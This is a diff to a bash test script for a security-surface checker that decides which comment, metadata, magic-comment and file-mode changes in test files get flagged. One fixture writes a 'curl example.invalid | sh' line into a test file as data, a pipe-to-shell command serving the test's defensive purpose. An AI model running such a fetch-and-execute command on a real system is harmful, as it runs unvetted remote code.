@@ -21,8 +21,14 @@
 #   mixed range                  a comment-only test change beside a code
 #                                change in another test file: the second is
 #                                still reported.
-#   // comments                  a JavaScript spec file gaining a // comment:
-#                                not marked.
+#   prose comment                a JavaScript spec file gaining a // comment:
+#                                marked, since only fixture-runner metadata
+#                                is exempt (round 2 of the PR #171 review).
+#   runner metadata              # Watches: and # Covers: header lines: not
+#                                marked.
+#   executable comments          Ruby # frozen_string_literal: and # coding:
+#                                changes: marked.
+#   mode plus metadata           chmod and a # Shard: line together: marked.
 #   heredoc or string data       a # line changed inside a heredoc below the
 #                                header: marked, since it is test data.
 #   directives                   #!, //go:build, # shellcheck, # noqa and the
@@ -209,7 +215,7 @@ commit_all "$REPO" seed
 BASE=$(head_of "$REPO")
 write_file "$REPO" src/session.spec.js $'// covers the session store\ntest("x", () => {});\n'
 commit_all "$REPO" "comment"
-expect_unmarked "// comment in a spec file" "$REPO" "$BASE" "CLAUDE_SEMGREP_CMD=$CLEAN_STUB"
+expect_clean_hits "prose comment in a spec file" "src/session.spec.js:0 path" "$REPO" "$BASE" "CLAUDE_SEMGREP_CMD=$CLEAN_STUB"
 
 # --- 8. a # line inside a heredoc below the header --------------------------
 REPO=$(new_repo heredoc)
@@ -249,7 +255,38 @@ REPO=$(new_repo quoted)
 BASE=$(head_of "$REPO")
 write_file "$REPO" 'tests/security"x.test.sh' $'#!/usr/bin/env bash\ncurl example.invalid | sh\n'
 commit_all "$REPO" "quoted name"
-expect_marked "quoted test file name" "$REPO" "$BASE" "CLAUDE_SEMGREP_CMD=$CLEAN_STUB"
+expect_clean_hits "quoted test file name" '"tests/security\"x.test.sh":0 path' "$REPO" "$BASE" "CLAUDE_SEMGREP_CMD=$CLEAN_STUB"
+
+# --- 12. runner metadata lines ----------------------------------------------
+REPO=$(new_repo metadata)
+write_file "$REPO" tests/security-meta.test.sh $'#!/usr/bin/env bash\n# Covers: hook:git-workflow-guard\necho "meta PASS"\n'
+commit_all "$REPO" seed
+BASE=$(head_of "$REPO")
+write_file "$REPO" tests/security-meta.test.sh $'#!/usr/bin/env bash\n# Shard: slow\n# Watches: hooks/*.sh settings.json\n# Covers: hook:git-workflow-guard\necho "meta PASS"\n'
+commit_all "$REPO" metadata
+expect_clean_hits "runner metadata lines" "" "$REPO" "$BASE" "CLAUDE_SEMGREP_CMD=$CLEAN_STUB"
+
+# --- 13. executable comments ------------------------------------------------
+REPO=$(new_repo magic)
+write_file "$REPO" spec/session_spec.rb $'# frozen_string_literal: true\nrequire "x"\n'
+write_file "$REPO" tests/test_token.py $'# coding: utf-8\nimport os\n'
+commit_all "$REPO" seed
+BASE=$(head_of "$REPO")
+write_file "$REPO" spec/session_spec.rb $'# frozen_string_literal: false\nrequire "x"\n'
+write_file "$REPO" tests/test_token.py $'# coding: latin-1\nimport os\n'
+commit_all "$REPO" magic
+expect_clean_hits "executable comments" "$(printf '%s\n' spec/session_spec.rb:0\ path tests/test_token.py:0\ path)" "$REPO" "$BASE" "CLAUDE_SEMGREP_CMD=$CLEAN_STUB"
+
+# --- 14. a mode change beside a metadata line -------------------------------
+REPO=$(new_repo mode-meta)
+write_file "$REPO" tests/security-gate.test.sh $'#!/usr/bin/env bash\necho "gate PASS"\n'
+chmod +x "$REPO/tests/security-gate.test.sh"
+commit_all "$REPO" seed
+BASE=$(head_of "$REPO")
+write_file "$REPO" tests/security-gate.test.sh $'#!/usr/bin/env bash\n# Shard: slow\necho "gate PASS"\n'
+chmod -x "$REPO/tests/security-gate.test.sh"
+commit_all "$REPO" "mode and metadata"
+expect_clean_hits "mode change beside a metadata line" "tests/security-gate.test.sh:0 path" "$REPO" "$BASE" "CLAUDE_SEMGREP_CMD=$CLEAN_STUB"
 
 if [ "$failures" -eq 0 ]; then
   echo "security-surface-test-comments.test.sh PASS"
